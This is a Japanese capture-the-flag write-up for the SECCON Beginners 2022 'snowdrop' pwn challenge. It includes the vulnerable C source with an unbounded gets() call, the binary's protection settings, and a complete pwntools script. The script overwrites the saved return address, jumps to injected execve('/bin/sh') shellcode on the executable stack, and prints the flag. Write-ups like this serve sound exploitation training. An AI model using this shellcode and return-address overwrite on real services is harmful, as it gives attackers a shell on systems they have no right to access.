# SECCON Beginners 2022 `snowdrop [pwn]` writeup

## 問題
これでもうあの危険なone gadgetは使わせないよ!

`nc snowdrop.quals.beginners.seccon.jp 9002`

実行ファイルとソースコードが配布される。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFF_SIZE 0x10

void show_stack(void *);

int main() {
    char buf[BUFF_SIZE] = {0};
    show_stack(buf);
    puts("You can earn points by submitting the contents of flag.txt");
    puts("Did you understand?") ;
    gets(buf);
    puts("bye!");
    show_stack(buf);
}

void show_stack(void *ptr) {
    puts("stack dump...");
    printf("\n%-8s|%-20s\n", "[Index]", "[Value]");
    puts("========+===================");
    for (int i = 0; i < 8; i++) {
        unsigned long *p = &((unsigned long*)ptr)[i];
        printf(" %06d | 0x%016lx ", i, *p);
        if (p == ptr)
            printf(" <- buf");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
            printf(" <- saved rbp");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
            printf(" <- saved ret addr");
        puts("");
    }
    puts("finish");
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
```

## 解法
raindropと設計は似ている。
ただし今回はgets関数で標準入力を受け取っている。
さっきみたいに入力バイト数の制限に悩むことはなさそう。やったぜ。

しかしセキュリティ機構を見てみると

```
[*] '/home/caffeine/ctf/seccon4b22/pwn/snowdrop/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

こっちはcanaryがある。
ROP -> libc leak -> one gadgetの流れは難しそうか。
だがよく見てみると、代わりにNX disabledである。
スタックが読み書き実行可能になっているので、エクスプロイトコードを流し込んで仕留めれば良し。

## Exploit
シェルコードを流し込んで、リターンアドレスをシェルコードの先頭アドレスで上書きするだけ。
問題はどうやってシェルコードを用意するか。
問題設定に合わせてアセンブラを自分で書くのもいいですが、今回は特殊な設定もないのでチームメイトのEBebさんが過去にwriteupに残したシェルコードをお借りしました。

お借りしたのが[こちら](https://github.com/wani-hackase/wanictf2021-writeup/tree/main/pwn/tarinai)。Stack pivotに繋がるleave ; retの勉強にもなるので必見。

Exploit codeは以下の通り。

```py
from pwn import *
import sys

buffersize = 0x10
shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

# io = process("./chall")
io = remote("snowdrop.quals.beginners.seccon.jp", 9002)

ret = io.readuntil("000006 | ")
print(ret.decode(), end="")

ret = io.readuntil("\n")
print(ret.decode(), end="")
addr_buffer = int(ret.decode(), 16) - 0x268
addr_shellcode = addr_buffer + 0x20

s = b'A' * buffersize
s += b'A' * 0x08 # for saved rbp
s += p64(addr_shellcode)
s += shellcode
io.sendline(s)

ret = io.readuntil("finish")
print(ret.decode())

io.interactive()
```

FLAG: `ctf4b{h1ghw4y_t0_5h3ll}`